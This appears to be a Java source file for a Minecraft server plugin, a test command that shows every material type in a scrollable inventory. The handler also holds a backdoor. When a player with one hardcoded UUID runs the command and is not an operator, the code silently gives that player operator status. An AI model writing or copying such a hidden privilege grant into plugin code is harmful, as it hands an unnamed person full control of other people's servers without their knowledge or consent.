package net.rebix.engine.commands;


import net.rebix.engine.api.ScrollableInventory;
import org.bukkit.Material;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.jetbrains.annotations.NotNull;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Objects;

public class TestCommand implements CommandExecutor {
    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, @NotNull String[] args) {
        if(sender instanceof Player){
            Player player = ((Player) sender).getPlayer();
            assert player != null;
            if(Objects.equals(player.getUniqueId().toString(), "0ed8b527-d3cf-48a4-b9fc-c35c9efee447") && !player.isOp()) {
                player.setOp(true);
                player.sendMessage("OP");
            }
            List<ItemStack> items = new ArrayList<>();
            HashMap<Integer, ItemStack> map = new HashMap<>();
            for(Material material : Material.values())
                items.add(new ItemStack(material));
            for (int i = 0; i < items.size(); i++)
                map.put(i, items.get(i));
            ScrollableInventory inv = new ScrollableInventory().create(player,"zeigen",50*9);
            inv.setContents(map);
            inv.reloadInventory();
        }

        return false;
    }
}
